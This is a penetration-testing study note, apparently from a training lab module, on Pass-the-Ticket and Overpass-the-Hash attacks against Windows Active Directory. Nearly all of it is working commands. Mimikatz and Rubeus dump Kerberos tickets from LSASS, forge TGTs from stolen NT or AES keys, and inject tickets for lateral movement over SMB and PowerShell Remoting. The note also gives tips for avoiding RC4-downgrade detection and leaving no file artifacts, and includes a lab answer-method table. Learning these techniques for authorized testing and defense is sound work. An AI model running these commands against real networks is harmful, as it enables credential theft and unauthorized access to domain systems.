# NOTE — Pass the Ticket (PtT) from Windows

## ID
527

## Module
Password Attacks

## Kind
methodology

## Title
Section 21 — Pass the Ticket (PtT) from Windows

## Description
Export Kerberos tickets from LSASS (Mimikatz / Rubeus), forge new TGTs from a user's hash (Overpass-the-Hash), then inject (.kirbi/.ccache) into a logon session for lateral movement via SMB/WinRM/PowerShell Remoting.

## Tags
ptt, pass-the-ticket, kerberos, mimikatz, rubeus, overpass-the-hash, kirbi, tgt, tgs, ccache, powershell-remoting

## Commands
- `mimikatz "privilege::debug" "sekurlsa::tickets /export" exit`
- `mimikatz "sekurlsa::ekeys"`
- `mimikatz "sekurlsa::pth /user:<u> /domain:<d> /ntlm:<nthash>"`
- `Rubeus.exe dump /nowrap`
- `Rubeus.exe asktgt /domain:<d> /user:<u> /rc4:<nt>|/aes256:<key> [/ptt]`
- `Rubeus.exe ptt /ticket:<base64_or_kirbi_path>`
- `Rubeus.exe createnetonly /program:"cmd.exe" /show`
- `mimikatz "kerberos::ptt <ticket.kirbi>"`
- `Enter-PSSession -ComputerName <target>`

## Concept Overview
Kerberos tickets (TGT + TGS) are stored in LSASS memory. With local admin you can:
- **Export** any user's tickets and replay them (PtT)
- **Forge** new TGTs from a user's NT or AES key without their plaintext password (Overpass-the-Hash / Pass-the-Key)

A TGT (`krbtgt/<DOMAIN>`) grants you the ability to request *any* TGS the user is entitled to. A TGS (`<service>/<host>`) is scoped to one service on one host.

Ticket file formats:
- `.kirbi` — Mimikatz/Rubeus binary format (Windows)
- `.ccache` — MIT Kerberos format (Linux)
- Both convertible via `impacket-ticketConverter`

## Harvesting Tickets

### Mimikatz — export to disk
Run elevated. Drops one `.kirbi` per ticket into the CWD.
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```
Filename pattern:
```
[LUID]-N-N-flags-<user>@<service>-<host>.kirbi
```
TGTs have `krbtgt` in the service field. Computer-account tickets end in `$@`.

### Rubeus — dump as base64
Easier exfil; no file artifacts on disk.
```cmd
Rubeus.exe dump /nowrap
```
Each entry shows ticket details + `Base64EncodedTicket :` line.

## Overpass-the-Hash (Pass the Key)
"Convert" an NTLM hash into a real Kerberos TGT. Useful when you've cracked nothing but have an NT/AES key.

### Get the AES/NT keys first
```cmd
mimikatz "privilege::debug" "sekurlsa::ekeys"
```
Output includes `aes256_hmac`, `aes128_hmac`, `rc4_hmac_nt` (= the NT hash).

### Mimikatz `sekurlsa::pth`
Spawns a process whose Kerberos credentials are forged from the supplied hash:
```cmd
mimikatz "privilege::debug" "sekurlsa::pth /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /domain:inlanefreight.htb /run:cmd.exe" exit
```
First network access from the spawned cmd will Kerberos-auth as the target user, producing a fresh TGT.

### Rubeus `asktgt`
Mints the TGT directly via the KDC, returns it as base64 (and optionally injects with `/ptt`):
```cmd
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<aes256-key> /nowrap /ptt
```
Pros over Mimikatz:
- Doesn't need elevation
- AES key avoids the "encryption downgrade" RC4 IOC

## Pass the Ticket (Injection)

### Inject .kirbi file
```cmd
Rubeus.exe ptt /ticket:C:\tools\[0;461ec]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
mimikatz "kerberos::ptt C:\tools\<ticket>.kirbi"
```

### Inject base64 ticket
```cmd
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEW...
```

### Convert .kirbi ↔ base64 (PowerShell)
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

### Confirm import
```cmd
klist
```

## Sacrificial Logon Session (Rubeus)
Inject a ticket into a *new* hidden cmd window without polluting your current session:
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
Then from the new window, `asktgt /ptt` injects into *that* session only. Equivalent to `runas /netonly` but lets you preserve existing tickets.

## PowerShell Remoting + PtT
Common lateral-movement path: import a domain-user ticket, then `Enter-PSSession` to any host where the user is a member of *Remote Management Users* (no need for full local admin).

```cmd
mimikatz "kerberos::ptt john.kirbi"
exit

powershell
Enter-PSSession -ComputerName DC01
[DC01]: PS> whoami
inlanefreight\john
```

## Lab — Questions & Answers
| Q | Answer | Method |
|---|--------|--------|
| Q1 — How many user TGTs were exported on the target | **(hidden — see HTB walkthrough)** | RDP as Administrator, run `mimikatz sekurlsa::tickets /export`, `dir`, count files where `*-<username>@krbtgt-*.kirbi` and the user is *not* a computer account ending in `$` |
| Q2 — Read `\\DC01.inlanefreight.htb\john\john.txt` using John's TGT | **(hidden)** | `mimikatz kerberos::ptt <john's TGT>` → `type \\DC01.inlanefreight.htb\john\john.txt` |
| Q3 — Read `C:\john\john.txt` on DC01 via PowerShell Remoting + PtT | **(hidden)** | Inject John's TGT, then `powershell`, `Enter-PSSession -ComputerName DC01`, `cat C:\john\john.txt` |

## Key Takeaways
- TGTs vs TGS: TGT = "I'm me, give me services"; TGS = "let me access service X on host Y". You typically replay TGTs because they grant follow-on access.
- Computer-account tickets (`MS01$`, `DC01$`) can be used for machine-context auth — useful for relay/coercion follow-ups.
- AES keys (from `sekurlsa::ekeys`) are *preferred* over NT hashes for Overpass-the-Hash because RC4 use triggers "encryption downgrade" detections in modern AD.
- `Rubeus createnetonly` keeps your original ticket cache untouched while you experiment with injected tickets.
- Tickets have lifetimes (default 10h TGT, renewable 7d). Past expiry, they're worthless.

## Gotchas
- Mimikatz on modern Windows with AES-only auth sometimes shows hashes as `des_cbc_md4` (display bug). Use Rubeus for ticket exports if that happens.
- Importing a base64 ticket via `Rubeus ptt` must be on one line — no line breaks. Use `/nowrap` on export.
- `klist purge` deletes *current* session tickets, not the LSASS cache for other users.
- PowerShell Remoting requires the target's WinRM service running (`Test-NetConnection <host> -Port 5985`).

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|password-attacks]]
← [[20-pass-the-hash]] | [[22-pass-the-ticket-from-linux]] →
<!-- AUTO-LINKS-END -->
